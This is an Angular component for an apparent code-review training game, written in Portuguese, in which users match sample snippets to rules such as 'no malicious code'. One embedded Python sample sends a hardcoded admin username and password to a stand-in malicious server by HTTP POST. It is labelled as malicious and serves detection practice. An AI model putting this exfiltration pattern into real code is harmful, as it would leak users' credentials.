import { Component } from '@angular/core';
import { Codigo } from './interfaces/codigo';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  erro = {
    codigoMalicioso : "codigoMalicioso",
    nomenclaturaErrada : "nomenclaturaErrada",
    none : ''
  }

  regras = [
    {
      regra : 'Não pode ter codigo malicioso',
      error : this.erro.codigoMalicioso
    }
  ]

  codigo = [
    {
      function : `def enviar_dados_sensiveis():
      dados = {
          'usuario': 'admin',
          'senha': '123456'
      }
      response = requests.post('http://www.servidor-malicioso.com', data=dados)`,
      error : this.erro.codigoMalicioso,
      detected : false
    },
    {
      function : `def calcular_soma(lista):
      soma = 0
      for elemento in lista:
          soma += elemento
      return soma`,
      error : this.erro.none,
      detected : false
    },
    
  ]

  codigoSelecionado : any
  index : any
  regraSelecionada : any

  erroDetectado: any

  approved() {
    var errorDetected = false
    this.codigo.forEach((e) => {
      if(e.error != this.erro.none) errorDetected = true
    })

    if(errorDetected) console.log("Você aprovou um codigo com falhas, se sinta envergonhado!!!")
    else console.log("tudo de acordo, parabens!")
  }

  declined() {
    var errorDetected = false
    this.codigo.forEach((e) => {
      if(e.error != this.erro.none && !e.detected) errorDetected = true
    })

    if(errorDetected) console.log("Um codigo rejeitado deve haver justificativas")
    else console.log("Você recusou um codigo com problemas, muito bem!")
  }

  codigoSelected(code: any, i : number) {
    this.codigoSelecionado = code
    this.index = i
    this.compare()
  }
  
  regraSelected(regra: any) {
    this.regraSelecionada = regra
    this.compare()
  }

  async compare() {
    if(this.codigoSelecionado == null || this.regraSelecionada == null) return
    if(this.codigoSelecionado.error == this.regraSelecionada.error) {
      console.log("achou um erro")
      this.codigo[this.index].detected = true
    }else {
      console.log("Tudo certo por aqui!")
    }
    await new Promise(resolve => setTimeout(resolve, 300));
    this.codigoSelecionado = null
    this.regraSelecionada = null
  }
}
